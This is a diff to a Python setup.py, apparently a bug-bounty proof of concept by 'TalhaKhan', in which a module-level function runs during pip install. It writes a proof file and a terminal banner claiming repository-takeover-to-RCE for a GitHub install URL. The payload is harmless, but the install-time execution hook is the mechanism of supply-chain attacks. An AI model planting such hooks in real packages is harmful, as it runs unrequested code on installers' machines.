@@ -1,8 +1,6 @@
 from setuptools import setup
 import os
-import sys
 
-# ---- ONE-TIME EXECUTION LOCK ----
 LOCK_FILE = "/tmp/.supply_chain_poc_lock"
 
 def run_poc_once():
@@ -18,45 +16,54 @@ def run_poc_once():
 
     pid = os.getpid()
     poc_file = f"/tmp/SUPPLY_CHAIN_POC_{pid}.txt"
+    user = os.getenv("USER", "unknown")
 
-    # ---- PROOF FILE ----
+    banner = (
+        "┌──────────────────────────────────────────────────────┐\n"
+        "│          SUPPLY CHAIN ATTACK – PROOF OF CONCEPT       │\n"
+        "│                    by TalhaKhan                       │\n"
+        "└──────────────────────────────────────────────────────┘\n"
+    )
+
+    # ---- PROOF FILE (FORENSIC ARTIFACT) ----
     with open(poc_file, "w") as f:
-        f.write("╔══════════════════════════════════════════════════════╗\n")
-        f.write("║        SUPPLY CHAIN ATTACK POC BY TALHAKHAN          ║\n")
-        f.write("╚══════════════════════════════════════════════════════╝\n")
-        f.write(f"\n📁 Proof File: {poc_file}\n")
-        f.write(f"🔢 Process ID: {pid}\n")
-        f.write(f"👤 User: {os.getenv('USER')}\n")
-        f.write("🔗 Source: pip install git+https://github.com/...\n")
-        f.write("\n" + "─"*55 + "\n")
-        f.write("🚨 VULNERABILITY CONFIRMED 🚨\n")
-        f.write("─"*55 + "\n")
-        f.write("• pip install from GitHub URL\n")
-        f.write("• Repository Takeover → RCE\n")
-        f.write("• Affects CI / Vendors / SAP HANA\n")
-        f.write("─"*55 + "\n")
+        f.write(banner)
+        f.write("\n")
+        f.write(f"Proof File   : {poc_file}\n")
+        f.write(f"Process ID   : {pid}\n")
+        f.write(f"Executed As  : {user}\n")
+        f.write("\n")
+        f.write("Summary:\n")
+        f.write("────────\n")
+        f.write("- Code executed during `pip install` from GitHub URL\n")
+        f.write("- Execution occurs during build / metadata phase\n")
+        f.write("- Impact: Repository Takeover → Remote Code Execution\n")
+        f.write("\n")
+        f.write("Affected Pattern Example:\n")
+        f.write("────────────────────────\n")
+        f.write("git+https://github.com/alundesap/python-jws.git/#egg=jws\n")
 
-    # ---- TERMINAL OUTPUT (CLEAN, NO COLORS) ----
+    # ---- TERMINAL OUTPUT (CLEAN & PROFESSIONAL) ----
     try:
         term = open("/dev/tty", "w")
-        term.write("\n" + "━"*55 + "\n")
-        term.write("  SUPPLY CHAIN ATTACK POC BY TALHAKHAN\n")
-        term.write("━"*55 + "\n")
-        term.write(f"\n✅ Proof File: {poc_file}\n")
-        term.write(f"🔢 Process ID: {pid}\n")
-        term.write("\n🚨 VULNERABILITY CONFIRMED\n")
-        term.write("─"*30 + "\n")
+        term.write("\n" + banner)
+        term.write("\n")
+        term.write("✔ Installation triggered arbitrary code execution\n\n")
+        term.write(f"• Proof File : {poc_file}\n")
+        term.write(f"• Process ID: {pid}\n\n")
+        term.write("Impact:\n")
+        term.write("───────\n")
         term.write("• pip install from GitHub URL\n")
-        term.write("• Impact: Repository Takeover → RCE\n")
-        term.write("\n📦 SAP HANA example:\n")
+        term.write("• Repository Takeover → RCE\n\n")
+        term.write("Enterprise Example:\n")
+        term.write("───────────────────\n")
         term.write("git+https://github.com/alundesap/python-jws.git/#egg=jws\n")
-        term.write("━"*55 + "\n")
+        term.write("\n")
         term.close()
     except:
         pass
 
 
-# ---- EXECUTE ONCE PER INSTALL ----
 run_poc_once()
 
 setup(
